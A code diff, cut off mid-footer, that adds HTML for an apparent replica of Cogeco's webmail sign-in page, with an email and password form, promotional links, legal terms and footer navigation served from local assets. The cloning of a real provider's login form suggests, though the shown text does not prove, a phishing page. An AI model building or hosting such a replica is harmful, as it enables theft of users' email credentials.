+                class="call-us button button-coral-light fontReducer"
+                >1-866-261-4447</a
+              >
+              <button
+                type="button"
+                id="icon_search-link"
+                class="search-icon-link"
+                aria-label="Search"
+                data-track-link-title="search"
+              >
+                <span class="icon-magnify" aria-hidden="true"></span>
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <div class="header-search">
+          <div
+            class="header-search-container container"
+            data-track-section-name="search"
+          >
+            <div class="row">
+              <div class="col-12">
+                <form
+                  action="/en/search"
+                  method="get"
+                  onsubmit="return jQuery(this).find('.search_input').val()!='';"
+                >
+                  <label for="q2" class="hidden-off-screen"
+                    >What are you looking for?</label
+                  >
+                  <input
+                    id="q2"
+                    class="search_input"
+                    name="q"
+                    value=""
+                    placeholder="What are you looking for?"
+                    type=""
+                  />
+                  <input
+                    class="site"
+                    name="site"
+                    value="cogeco.ca/en/"
+                    type="hidden"
+                  />
+                  <label for="search_submit_button2" class="hidden-off-screen"
+                    >Submit</label
+                  >
+                  <input
+                    id="search_submit_button2"
+                    class="search_submit"
+                    src="./assets/images/search.svg"
+                    alt="Submit"
+                    type="image"
+                    data-track-link-title="search-button"
+                  />
+                </form>
+                <button class="close-btn" aria-label="Close"></button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </header>
+
+      <div id="header-spacer" style="height: 98px"></div>
+
+      <div id="outer-container" data-section="residential">
+        <div id="push-anim-overlay"></div>
+
+        <div data-drupal-messages-fallback="" class="hidden"></div>
+        <div id="block-cogeco-content">
+          <div class="node-basic" data-georedirect="disable">
+            <div class="content">
+              <div class="breadcrumb">
+                <div class="container">
+                  <nav aria-label="Breadcrumb">
+                    <ol>
+                      <li>
+                        <a href="https://www.cogeco.ca/en/home">Home</a>
+                      </li>
+                      <li>
+                        <span aria-current="page">Webmail</span>
+                      </li>
+                    </ol>
+                  </nav>
+                </div>
+              </div>
+
+              <div id="component-0">
+                <section id="" class="component-webmail">
+                  <div class="container">
+                    <div class="row">
+                      <div class="col-12 col-lg-6">
+                        <div class="webmail">
+                          <h1>
+                            Welcome to Cogeco Webmail. Great to see you again.
+                          </h1>
+                          <div class="node-component-block">
+                            <div
+                              class="webmail-login-form"
+                              data-drupal-selector="webmail-login-form"
+                              id="block-webmail-login-form"
+                            >
+                              <div class="container">
+                                <form
+                                  id="webmail-login-form"
+                                  accept-charset="UTF-8"
+                                  novalidate="novalidate"
+                                >
+                                  <section class="form">
+                                    <div class="container">
+                                      <div class="row">
+                                        <div
+                                          class="mx-auto form-width position-relative"
+                                        >
+                                          <div id="webmail-spinner">
+                                            <div
+                                              class="spinner-border"
+                                              role="status"
+                                            >
+                                              <span class="sr-only"
+                                                >Loading</span
+                                              >
+                                            </div>
+                                          </div>
+                                          <div
+                                            class="row txt-center no-gutters error-message"
+                                            id="error-message"
+                                          >
+                                            Your email address or password is
+                                            invalid. Please try again.
+                                          </div>
+                                          <input
+                                            data-drupal-selector="edit-pass-goto"
+                                            type="hidden"
+                                            name="pass_goto"
+                                            value="https://www.cogeco.ca/en/webmail-login"
+                                          />
+                                          <input
+                                            data-drupal-selector="edit-lan"
+                                            type="hidden"
+                                            name="lan"
+                                            value="en"
+                                          />
+                                          <input
+                                            data-drupal-selector="edit-st"
+                                            type="hidden"
+                                            name="st"
+                                            value="on"
+                                          />
+                                          <div class="row no-gutters">
+                                            <div
+                                              class="js-form-item form-item js-form-type-textfield form-item-username js-form-item-username"
+                                            >
+                                              <label
+                                                for="edit-username"
+                                                class="js-form-required form-required"
+                                                >Email address</label
+                                              >
+                                              <input
+                                                data-error-message="Please enter a valid email address (e.g., your.email@cogeco.ca)."
+                                                data-drupal-selector="edit-username"
+                                                type="text"
+                                                id="edit-username"
+                                                name="username"
+                                                value=""
+                                                size="60"
+                                                maxlength="128"
+                                                placeholder="your.email@cogeco.ca"
+                                                class="form-text required"
+                                                required="required"
+                                                aria-required="true"
+                                              />
+                                              <label
+                                                id="edit-username-error"
+                                                class="error"
+                                                for="edit-username"
+                                                >Please enter a valid email
+                                                address (e.g.,
+                                                your.email@cogeco.ca).</label
+                                              >
+                                            </div>
+                                          </div>
+                                          <div class="row no-gutters">
+                                            <div
+                                              class="js-form-item form-item js-form-type-password form-item-pass js-form-item-pass"
+                                            >
+                                              <label
+                                                for="edit-pass"
+                                                class="js-form-required form-required"
+                                                >Password</label
+                                              >
+                                              <input
+                                                data-error-message="Password is missing."
+                                                data-drupal-selector="edit-pass"
+                                                type="password"
+                                                id="edit-pass"
+                                                name="pass"
+                                                size="60"
+                                                maxlength="128"
+                                                class="form-text required"
+                                                required="required"
+                                                aria-required="true"
+                                              />
+                                            </div>
+                                          </div>
+                                          <div class="remember-email">
+                                            <div
+                                              class="js-form-item form-item js-form-type-checkbox form-item-remember-me js-form-item-remember-me"
+                                            >
+                                              <input
+                                                data-drupal-selector="edit-remember-me"
+                                                type="checkbox"
+                                                id="edit-remember-me"
+                                                name="remember_me"
+                                                value="1"
+                                                class="form-checkbox"
+                                              />
+
+                                              <label
+                                                for="edit-remember-me"
+                                                class="option"
+                                                >Remember my email
+                                                address</label
+                                              >
+                                            </div>
+                                          </div>
+                                          <div class="password-reset">
+                                            <div
+                                              id="edit-forgot"
+                                              class="js-form-item form-item js-form-type-item form-item-forgot js-form-item-forgot form-no-label"
+                                            >
+                                              <a
+                                                href="https://support.cogeco.ca/hc/en-ca/articles/360059891873"
+                                                target="_blank"
+                                                >Forgot your password or
+                                                email?</a
+                                              >
+                                            </div>
+                                          </div>
+                                          <input
+                                            autocomplete="off"
+                                            data-drupal-selector="form-mkjegzznw4wzl-djlg3mjuv-ffwop5f6knf3sqkg2ys"
+                                            type="hidden"
+                                            name="form_build_id"
+                                            value="form-Mkjegzznw4wZl_DJLG3mJuV-ffwOp5F6Knf3sqkG2Ys"
+                                          />
+                                          <input
+                                            data-drupal-selector="edit-webmail-login-form"
+                                            type="hidden"
+                                            name="form_id"
+                                            value="webmail_login_form"
+                                          />
+                                          <div
+                                            data-drupal-selector="edit-actions"
+                                            class="form-actions js-form-wrapper form-wrapper"
+                                            id="edit-actions"
+                                          >
+                                            <div
+                                              class="row no-gutters last-row"
+                                            >
+                                              <input
+                                                type="submit"
+                                                id="submit-btn"
+                                                name="op"
+                                                value="Sign in"
+                                                class="button js-form-submit form-submit"
+                                              />
+                                            </div>
+                                          </div>
+
+                                          <input
+                                            autocomplete="off"
+                                            data-drupal-selector="form-mkjegzznw4wzl-djlg3mjuv-ffwop5f6knf3sqkg2ys"
+                                            type="hidden"
+                                            name="form_build_id"
+                                            value="form-Mkjegzznw4wZl_DJLG3mJuV-ffwOp5F6Knf3sqkG2Ys"
+                                          />
+
+                                          <input
+                                            data-drupal-selector="edit-webmail-login-form"
+                                            type="hidden"
+                                            name="form_id"
+                                            value="webmail_login_form"
+                                          />
+                                        </div>
+                                      </div>
+                                    </div>
+                                  </section>
+                                </form>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="col-12 col-lg-6">
+                        <div class="checkerboard-item coral-tr-gradient">
+                          <div class="icon-image border-svg">
+                            <img
+                              src="./assets/icons/svg/my-account-duo-24.svg"
+                              alt=""
+                            />
+                          </div>
+                          <h2>Get to know Webmail</h2>
+                          <div class="text-align-left body-text row">
+                            <p>
+                              Cogeco Webmail has convenient features, such as
+                              seamless navigation between your inbox, calendar
+                              and contacts.
+                            </p>
+                          </div>
+                          <a
+                            href="/en/support/internet/webmail"
+                            class="button button-coral-dark"
+                            target=""
+                            >Learn more</a
+                          >
+                          <div class="decorative-image">
+                            <img
+                              src="./assets/images/Chevron-left-webmail2.png"
+                              alt=""
+                              loading="lazy"
+                              typeof="foaf:Image"
+                            />
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </section>
+              </div>
+
+              <div id="component-1">
+                <section id="" class="component-text-with-icons epico column-4">
+                  <div class="container">
+                    <div class="row">
+                      <div class="col-12">
+                        <h2 class="title" style="color: black">
+                          Use Webmail to its full potential
+                        </h2>
+
+                        <div class="content" style="color: black">
+                          <div class="items-container">
+                            <div class="paragraph--type--txt-icons">
+                              <div class="content-image small-image">
+                                <img
+                                  src="./assets/icons/svg-38/email-duo-coral.svg"
+                                  alt=""
+                                  loading="lazy"
+                                  typeof="foaf:Image"
+                                />
+                              </div>
+                              <div class="content-text" style="color: black">
+                                <h3 style="color: black">
+                                  Manage your addresses on My Account
+                                </h3>
+                                <p style="color: black">
+                                  Create, edit or delete email accounts and
+                                  passwords for your Webmail addresses on My
+                                  Account.
+                                </p>
+                                <a
+                                  href="https://myaccount.cogeco.ca/acpub/login"
+                                  class="button button-midnight-outl-light"
+                                  target=""
+                                >
+                                  Log in to My Account
+                                </a>
+                              </div>
+                            </div>
+
+                            <div class="paragraph--type--txt-icons">
+                              <div class="content-image small-image">
+                                <img
+                                  src="./assets/icons/svg-38/multi-device-duo-coral.svg"
+                                  alt=""
+                                  loading="lazy"
+                                  typeof="foaf:Image"
+                                />
+                              </div>
+                              <div class="content-text" style="color: black">
+                                <h3 style="color: black">
+                                  See how to set up email on other devices
+                                </h3>
+                                <p style="color: black">
+                                  Access your Cogeco email address from other
+                                  email client software on any device.
+                                </p>
+                                <a
+                                  href="https://support.cogeco.ca/hc/en-ca/articles/360059891913"
+                                  class="button button-midnight-outl-light"
+                                  target=""
+                                >
+                                  Learn how
+                                </a>
+                              </div>
+                            </div>
+
+                            <div class="paragraph--type--txt-icons">
+                              <div class="content-image small-image">
+                                <img
+                                  src="./assets/icons/svg-38/faq-duo-coral.svg"
+                                  alt=""
+                                  loading="lazy"
+                                  typeof="foaf:Image"
+                                />
+                              </div>
+                              <div class="content-text" style="color: black">
+                                <h3 style="color: black">
+                                  Get answers to your Webmail questions
+                                </h3>
+                                <p style="color: black">
+                                  For answers to all your questions about
+                                  Webmail and its range of features, visit our
+                                  FAQs.
+                                </p>
+                                <a
+                                  href="https://support.cogeco.ca/hc/en-ca/sections/360012112573"
+                                  class="button button-midnight-outl-light"
+                                  target=""
+                                >
+                                  Visit Webmail FAQs
+                                </a>
+                              </div>
+                            </div>
+
+                            <div class="paragraph--type--txt-icons">
+                              <div class="content-image small-image">
+                                <img
+                                  src="./assets/icons/svg-38/security-wifi-duo-coral.svg"
+                                  alt=""
+                                  loading="lazy"
+                                  typeof="foaf:Image"
+                                />
+                              </div>
+                              <div class="content-text" style="color: black">
+                                <h3 style="color: black">
+                                  Protect yourself against fraud
+                                </h3>
+                                <p style="color: black">
+                                  Learn how to identify fraudulent emails and
+                                  other ways scammers may try to get your
+                                  private information.
+                                </p>
+                                <a
+                                  href="https://support.cogeco.ca/hc/en-ca/sections/360012112433"
+                                  class="button button-midnight-outl-light"
+                                  target=""
+                                >
+                                  Learn about fraud and scams
+                                </a>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </section>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div id="block-blockthreeboxes">
+          <div
+            class="container p-6 three-cta"
+            data-track-component-type="navigation"
+            data-track-component-name="block three boxes"
+            data-track-component-position="bottom"
+          >
+            <h2 class="text-center">
+              Want to shop over the phone, find a store or manage your services
+              online?
+            </h2>
+            <ul class="row my-6">
+              <li class="col-md-6 col-lg-4 text-center mb-3">
+                <div
+                  class="cta-card p-5 text-center"
+                  data-track-section-name="speak with an agent"
+                >
+                  <div class="card-title">
+                    <a
+                      href="tel:+18662614447"
+                      class="blockcallus d-none d-sm-block d-md-none fontReducer"
+                      data-track-link-title="call us"
+                      >1-866-261-4447</a
+                    >
+                    <a
+                      href="/en/contact#block-findaretailer"
+                      class="d-sm-none d-md-block"
+                      data-track-link-title="call us"
+                      >Speak with an agent</a
+                    >
+                    <div class="card-content-mobile">
+                      We’re here 7 days a week to suggest services, promotions
+                      and answer questions.
+                    </div>
+                  </div>
+                  <img
+                    src="./assets/images/agent-light-38.svg"
+                    class="ls-is-cached lazyloaded"
+                    width="88"
+                    alt=""
+                  />
+                  <div class="card-content">
+                    We’re here to help you and suggest products and services,
+                    promotions and answer questions.
+                  </div>
+                  <a
+                    href="tel:+18662614447"
+                    tabindex="0"
+                    class="blockcallus link-stretched button button-midnight-outl-light fontReducer"
+                    data-track-link-title="call us"
+                    >1-866-261-4447</a
+                  >
+                </div>
+              </li>
+              <li class="col-md-6 col-lg-4 text-center mb-3">
+                <div
+                  class="cta-card p-5 text-center"
+                  data-track-section-name="find a store"
+                >
+                  <div class="card-title">
+                    <a
+                      href="/en/contact#block-findaretailer"
+                      class="d-none d-sm-block d-md-none"
+                      data-track-link-title="locate your nearest store"
+                      >Find a store</a
+                    >
+                    <a
+                      href="/en/contact#block-findaretailer"
+                      class="d-sm-none d-md-block"
+                      data-track-link-title="locate your nearest store"
+                      >Find a Cogeco store</a
+                    >
+                    <div class="card-content-mobile">
+                      Do you prefer shopping in person? We’re happy to serve you
+                      at your local Cogeco store.
+                    </div>
+                  </div>
+                  <img
+                    src="./assets/images/store-dark-88.svg"
+                    class="ls-is-cached lazyloaded"
+                    width="88"
+                    alt=""
+                  />
+                  <div class="card-content">
+                    Do you prefer shopping in person? We’re happy to serve you
+                    at your local Cogeco store.
+                  </div>
+                  <a
+                    href="/en/contact#block-findaretailer"
+                    tabindex="0"
+                    class="link-stretched button button-midnight-outl-light"
+                    data-track-link-title="locate your nearest store"
+                    >Locate your nearest store</a
+                  >
+                </div>
+              </li>
+              <li class="col-md-6 col-lg-4 text-center mb-3">
+                <div
+                  class="cta-card p-5 text-center"
+                  data-track-section-name="go to my account"
+                >
+                  <div class="card-title">
+                    <a
+                      href="https://myaccount.cogeco.ca/"
+                      data-track-link-title="log in now"
+                      >Go to My Account</a
+                    >
+                    <div class="card-content-mobile">
+                      From paying bills to modifying TV channels, My Account is
+                      your go-to destination.
+                    </div>
+                  </div>
+                  <img
+                    src="./assets/images/myaccount-duo-88.svg"
+                    class="ls-is-cached lazyloaded"
+                    width="88"
+                    alt=""
+                  />
+                  <div class="card-content">
+                    From paying bills to modifying TV channels, My Account is
+                    your go-to destination.
+                  </div>
+                  <a
+                    href="https://myaccount.cogeco.ca/"
+                    tabindex="0"
+                    class="link-stretched button button-midnight-outl-light"
+                    data-track-link-title="log in now"
+                    >Log in now
+                    <img
+                      src="./assets/images/external-link-blue-16.svg"
+                      width="16"
+                      alt=""
+                  /></a>
+                </div>
+              </li>
+            </ul>
+          </div>
+        </div>
+
+        <section class="component-expand legal expand">
+          <div class="container">
+            <div class="row">
+              <div class="col-12">
+                <button
+                  type="button"
+                  class="title"
+                  aria-controls="panel--63"
+                  aria-expanded="false"
+                >
+                  Legal information
+                </button>
+                <div class="expand-panel" id="panel--63" aria-hidden="true">
+                  <div class="content">
+                    <div class="header">
+                      General restrictions and legal information
+                    </div>
+                    <div class="body">
+                      <p>
+                        Limited time offer. Restricted to new customers and
+                        former customers who cancelled all of their services
+                        more than 6 months ago.
+                      </p>
+                      <p>
+                        Our network combines optical fibre and coaxial cable.
+                        Available where technology permits. For personal and
+                        residential purposes only. Visit cogeco.ca for details.
+                        Photos are for illustrative purposes only.
+                      </p>
+                      <p>
+                        A fee of $130 per technician visit for a standard
+                        installation or $20 if available for self-installation
+                        may apply. Supplementary installation fees may apply for
+                        additional work requested. A minimum commitment period
+                        corresponding to the offer and billed at the same
+                        address is required to benefit from these prices.
+                        Pre-authorized debit or credit card payment and service
+                        bundling on a single invoice may be required. A
+                        termination fee of up to $75 per service will be charged
+                        to customers who cancel their services before the end of
+                        the offer period.
+                      </p>
+                      <p>
+                        Sign up today at
+                        <a href="https://www.hayu.com/cogeco" tabindex="-1"
+                          >www.hayu.com/cogeco</a
+                        >
+                      </p>
+                      <p>BLACK FRIDAY OFFER 2023</p>
+                      <p>
+                        This offer is valid between November 13 to November 26,
+                        2023. In order to benefit from the first 2 months free,
+                        you must remain subscribed to this offer for the
+                        12-month commitment period immediately following your
+                        subscription to the Black Friday offer. In the event you
+                        cancel your service before the end of the commitment
+                        period, the 2 first months will be retroactively charged
+                        to your account upon cancellation of services.
+                      </p>
+                      <h3>INTERNET</h3>
+                      <p>
+                        Additional charges will apply for exceeding the monthly
+                        data transfer capacity (GB) allowed for each specific
+                        Cogeco Internet package.
+                        <a
+                          href="/sites/default/files/pdf/Legal/HSI_compare_on_en_2023.pdf"
+                          tabindex="-1"
+                          >See details</a
+                        >. Download and upload speeds can vary with Internet
+                        traffic, remote peers, the customer’s network
+                        configuration, the use of wireless equipment and other
+                        factors.
+                        <a href="/en/support/internet/faqs" tabindex="-1"
+                          >See details</a
+                        >. All Internet packages include 2 free installations of
+                        Cogeco Security services for desktop and/or laptop
+                        computers. Cogeco Security GO with unlimited
+                        installations for computers, tablets and wireless
+                        devices is available at a regular price of $5.99/month.
+                        <a href="/en/internet/security-services" tabindex="-1"
+                          >See details</a
+                        >. Wi-Fi hotspots provide free and unlimited Internet
+                        access to Cogeco subscribers and limited access to
+                        non-Cogeco subscribers.
+                        <a href="/en/internet/wifi-hotspots" tabindex="-1"
+                          >See details</a
+                        >. ULTRAFIBRE®
+                      </p>
+                      <p>
+                        Wi-Fi Pods and Wi-Fi Extenders require a subscription to
+                        an UltraFibre 40 Internet package or higher.
+                      </p>
+                      <p>
+                        UltraFibre 1 Gig Unlimited : Up to 1 Gbps of total
+                        download speed through the combination of multiple
+                        devices including at least one wired connection
+                        (Ethernet) combined with one or multiple wireless
+                        connections to Cogeco’s 1 Gig modem. Up to 940 Mbps
+                        download speed can be achieved when connecting to one
+                        personal Internet device with one wired connection
+                        (Ethernet).
+                      </p>
+                      <h3>EPICO</h3>
+                      <p>
+                        Cogeco EPICO service provides combined access to Cogeco
+                        TV and Internet services with a subscription to Cogeco
+                        TV, an EPICO 4K Box and a minimum subscription to the
+                        UltraFibre 60 Unlimited Internet package with a Wi-Fi
+                        modem.
+                      </p>
+                      <p>
+                        Download speed, upload speed, signal and picture quality
+                        can vary depending on various &nbsp;factors.
+                      </p>
+                      <p>
+                        Channel availability may vary by region. Selected TV
+                        channels can only be modified once every 30 days. The
+                        channel lists for the pre-selected packages cannot be
+                        modified. Additional fees may apply for some channels
+                        and some channels may count for several choices. Viewing
+                        content (live or recorded) is restricted to Canada.
+                      </p>
+                      <p>
+                        Channel availability for the Restart and Just Missed
+                        features may vary according to the content rights and
+                        viewing restrictions.
+                      </p>
+                      <p>
+                        A separate subscription to Netflix® is required. Counts
+                        towards customer’s Internet usage.
+                      </p>
+                      <p>
+                        The EPICO app provides access to the TV channels
+                        included in the EPICO package to which the customer is
+                        subscribed. Some channels included in the EPICO package
+                        may not be available to watch out-of-home due to content
+                        rights restrictions. Viewing content is restricted to
+                        Canada.
+                      </p>
+                      <p>
+                        On Demand requires a subscription to the TV package
+                        containing the associated digital channel. Purchased
+                        movies remain available as long as the customer is
+                        subscribed to the Cogeco EPICO service and as long as
+                        the title remains available in the On Demand library.
+                        Rented movies are available for the duration indicated
+                        on the screen.
+                      </p>
+                      <p>
+                        Beginning March 1st, 2022, all recordings are available
+                        for a maximum of 365 days or until the termination of
+                        your EPICO service.&nbsp;By default, older recordings
+                        will be automatically removed to match the number of
+                        hours in your block. Additional blocks of recording
+                        hours may be available to add with certain EPICO
+                        packages (up to 1000 hours of recording capacity).
+                      </p>
+                      <p>
+                        An EPICO package including an EPICO 4K Cloud PVR is
+                        required to download and view TV recordings in and
+                        out-of-home.
+                      </p>
+                      <p>
+                        One EPICO 4K Cloud PVR per TV set. Each additional EPICO
+                        4K Box or EPICO 4K Cloud PVR is available at $7 per
+                        month.
+                      </p>
+                      <h3>TELEVISION</h3>
+                      <p>
+                        Cogeco TV service requires the rental of an HD digital
+                        receiver with a minimum subscription to the Basic
+                        Channels package. Channel availability may vary by
+                        region. TV packages and selected channels can only be
+                        modified once every 30 days. Additional fees may apply
+                        for some channels and some channels may count for many
+                        choices. The channel lists of the pre-selected packages
+                        cannot be modified. Requirements to watch 4K: (i) a 4K
+                        TV and 4K receiver, (ii) a subscription to the SD/HD
+                        channels corresponding to the 4K channels. 4K not
+                        available with all channels.
+                      </p>
+                      <p>
+                        Access to the mobile apps requires a subscription to the
+                        TV package containing the associated digital channel.
+                        The content viewed on mobile apps requires bandwidth,
+                        which is included in the customer's Internet or cellular
+                        data package. Additional usage fees may apply if the
+                        customer exceeds the monthly data transfer capacity (GB)
+                        included in his package. Viewing content is restricted
+                        to Canada.
+                      </p>
+                      <p>
+                        TiVo service from Cogeco requires: (i) the rental of a
+                        TiVo receiver, (ii) a Wi-Fi modem, and (iii) a
+                        subscription to Cogeco Internet and (iv) a TV package.
+                        Each additional TV set combined with a TiVo PVR requires
+                        the rental of a TiVo HD receiver. Installation charges
+                        may apply for additional outlets. Data traffic consumed
+                        between the TiVo boxes and the Internet to supply
+                        programming information counts towards customer’s
+                        Internet usage. Additional usage fees may apply if the
+                        customer exceeds the monthly data transfer capacity (GB)
+                        included in the package. Viewing content is restricted
+                        to Canada. TiVo®. Apple®. YouTube®.
+                      </p>
+                      <p>
+                        Hunger Games: The ballad of songbirds and snakes → ©
+                        2023 Lions Gate Entertainment Inc. All Rights Reserved.
+                        Aquaman → © &amp; TM DC © 2023 Warner Bros. Ent. All
+                        Rights Reserved. Wonka → © 2023 Warner Bros.
+                        Entertainment Inc.
+                      </p>
+                      <h3>HOME PHONE</h3>
+                      <p>
+                        Phone equipment must stay at the same address where it
+                        was initially installed in order to allow 911 to
+                        associate the call with the correct address in the event
+                        of an emergency.
+                      </p>
+                      <p>HOME PHONE EQUIPMENT</p>
+                      <p>
+                        New generation Phone Equipment does not include an
+                        external backup battery. Batteries can be purchased
+                        separately for certain models (Hitron CODA-4589 and
+                        Arris TG3452G) while supplies last. Sagemcom (F@ST3896)
+                        equipment does not include a backup battery.
+                        <a
+                          href="https://support.cogeco.ca/hc/en-ca/articles/360058056414"
+                          tabindex="-1"
+                          >See details</a
+                        >
+                      </p>
+                      <p>
+                        Subscription to a Cogeco Home Phone package is required
+                        for all long distance plans. Limited to a list of
+                        countries predetermined by Cogeco. Additional minutes
+                        will be charged at the then current rate, per minute per
+                        country, applicable for the remainder of the month.<a
+                          href="/en/phone/long-distance-calling-features"
+                          tabindex="-1"
+                          >See details</a
+                        >. A fee of $0.95 per call for the use of the directory
+                        assistance (411) may apply, depending on the phone
+                        package.
+                      </p>
+                      <p>
+                        Starting November 30, 2023, people across Canada will be
+                        able to call and text 9-8-8, a new three-digit service,
+                        for help with mental health and suicide prevention.
+                        9-8-8 will be free for anyone in Canada who is thinking
+                        about suicide, in emotional distress, or who is worried
+                        about someone they know.
+                      </p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <footer
+          role="contentinfo"
+          class="footer"
+          data-track-component-type="navigation"
+          data-track-component-name="footer"
+          data-track-component-position="bottom"
+        >
+          <div class="container">
+            <div class="row">
+              <div class="col-12">
+                <nav role="navigation" aria-label="Footer EN" class="main-menu">
+                  <ul class="row">
+                    <li class="col-12 col-md-6 block-menu">
+                      <button
+                        type="button"
+                        class="accordion footer-title"
+                        aria-controls="shop-block"
+                        aria-expanded="false"
+                      >
+                        Shop<span
+                          class="icon-circle-down"
+                          aria-hidden="true"
+                        ></span>
+                      </button>
+
+                      <ul
+                        class="accordion-panel"
+                        id="shop-block"
+                        aria-hidden="true"
+                      >
+                        <li class="footer-link">
+                          <a
+                            href="/en/internet"
+                            data-track-section-name="shop"
+                            data-track-link-title="internet"
+                            data-drupal-link-system-path="node/44131"
+                            tabindex="-1"
+                            >Internet</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="/en/epico"
+                            data-track-section-name="Shop"
+                            data-track-link-title="EPICO TV + Internet"
+                            data-drupal-link-system-path="node/70036"
+                            tabindex="-1"
+                            >EPICO TV + Internet</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="/en/tv"
+                            data-track-section-name="Shop"
+                            data-track-link-title="TV"
+                            data-drupal-link-system-path="node/44296"
+                            tabindex="-1"
+                            >TV</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="/en/phone"
+                            data-track-section-name="Shop"
+                            data-track-link-title="Phone"
+                            data-drupal-link-system-path="node/44156"
+                            tabindex="-1"
+                            >Phone</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="/en/bundles-promotions"
+                            target="_self"
+                            data-track-section-name="shop"
+                            data-track-link-title="Promotions"
+                            title="Discover our packages"
+                            data-drupal-link-system-path="node/69681"
+                            tabindex="-1"
+                            >Promotions</a
+                          >
+                        </li>
+                      </ul>
+
+                      <hr aria-hidden="true" style="" />
+                    </li>
+
+                    <li class="col-12 col-md-6 block-menu footer-order">
+                      <button
+                        type="button"
+                        class="accordion footer-title"
+                        aria-controls="how-to-order-block"
+                        aria-expanded="false"
+                      >
+                        How to order<span
+                          class="icon-circle-down"
+                          aria-hidden="true"
+                        ></span>
+                      </button>
+
+                      <ul
+                        class="accordion-panel"
+                        id="how-to-order-block"
+                        aria-hidden="true"
+                      >
+                        <li class="footer-link">
+                          <a
+                            href="/en/contact/shopping"
+                            target="_self"
+                            data-track-section-name="how to order"
+                            data-track-link-title="Call us"
+                            tabindex="-1"
+                            >Call us</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="/en/bundles-promotions"
+                            target="_self"
+                            data-track-section-name="how to order"
+                            data-track-link-title="shop online"
+                            data-drupal-link-system-path="node/69681"
+                            tabindex="-1"
+                            >Shop online</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="/en/contact/shopping"
+                            target="_self"
+                            data-track-section-name="how to order"
+                            data-track-link-title="Go to a store"
+                            tabindex="-1"
+                            >Go to a store</a
+                          >
+                        </li>
+                      </ul>
+
+                      <hr aria-hidden="true" />
+                    </li>
+
+                    <li class="col-12 col-md-6 block-menu">
+                      <button
+                        type="button"
+                        class="accordion footer-title"
+                        aria-controls="my-cogeco-block"
+                        aria-expanded="false"
+                      >
+                        My Cogeco<span
+                          class="icon-circle-down"
+                          aria-hidden="true"
+                        ></span>
+                      </button>
+
+                      <ul
+                        class="accordion-panel"
+                        id="my-cogeco-block"
+                        aria-hidden="true"
+                      >
+                        <li class="footer-link">
+                          <a
+                            href="https://myaccount.cogeco.ca/acauth/all/tv/channel_selector/"
+                            data-track-section-name="my cogeco"
+                            data-track-link-title="modify tv channels"
+                            tabindex="-1"
+                            >Modify TV channels</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="https://horairetele.cogeco.ca/index.shtml?lang=EN"
+                            data-track-section-name="my cogeco"
+                            data-track-link-title="tv guide"
+                            tabindex="-1"
+                            >TV Guide</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="https://myaccount.cogeco.ca/acauth/all/billing/pay_bill/"
+                            data-track-section-name="my cogeco"
+                            data-track-link-title="pay my bill"
+                            tabindex="-1"
+                            >Pay my bill</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="https://myaccount.cogeco.ca/acauth/all/ebilling/"
+                            data-track-section-name="my cogeco"
+                            data-track-link-title="switch to eBilling"
+                            tabindex="-1"
+                            >Switch to eBilling</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="/en/move-easy"
+                            data-track-section-name="my cogeco"
+                            data-track-link-title="moving"
+                            data-drupal-link-system-path="node/72631"
+                            tabindex="-1"
+                            >Moving</a
+                          >
+                        </li>
+                      </ul>
+
+                      <hr aria-hidden="true" />
+                    </li>
+
+                    <li class="col-12 col-md-6 block-menu">
+                      <button
+                        type="button"
+                        class="accordion footer-title"
+                        aria-controls="support-block"
+                        aria-expanded="false"
+                      >
+                        Support<span
+                          class="icon-circle-down"
+                          aria-hidden="true"
+                        ></span>
+                      </button>
+
+                      <ul
+                        class="accordion-panel"
+                        id="support-block"
+                        aria-hidden="true"
+                      >
+                        <li class="footer-link">
+                          <a
+                            href="/en/contact"
+                            data-track-section-name="Support"
+                            data-track-link-title="Contact support"
+                            data-drupal-link-system-path="node/49931"
+                            tabindex="-1"
+                            >Contact support</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="/en/support"
+                            data-track-section-name="Support"
+                            data-track-link-title="Self-serve FAQs"
+                            data-drupal-link-system-path="node/48671"
+                            tabindex="-1"
+                            >Self-serve FAQs</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="/en/support/outages"
+                            target="_self"
+                            data-track-section-name="support"
+                            data-track-link-title="outages"
+                            data-drupal-link-system-path="node/56736"
+                            tabindex="-1"
+                            >Outages</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="/en/support"
+                            target="_self"
+                            data-track-section-name="support"
+                            data-track-link-title="support"
+                            data-drupal-link-system-path="node/48671"
+                            tabindex="-1"
+                            >Support</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="/en/support/billing-and-account"
+                            target="_self"
+                            data-track-section-name="support"
+                            data-track-link-title="billing &amp; account"
+                            data-drupal-link-system-path="node/48896"
+                            tabindex="-1"
+                            >Billing and account</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="/en/accessibility"
+                            target="_self"
+                            data-track-section-name="support"
+                            data-track-link-title="accessiblity"
+                            data-drupal-link-system-path="node/53666"
+                            tabindex="-1"
+                            >Accessiblity</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="/en/support/complaint"
+                            target="_self"
+                            data-track-section-name="support"
+                            data-track-link-title="making a complaint"
+                            data-drupal-link-system-path="node/50966"
+                            tabindex="-1"
+                            >Share a concern</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="/en/tv-subscription-summary"
+                            data-track-section-name="Support"
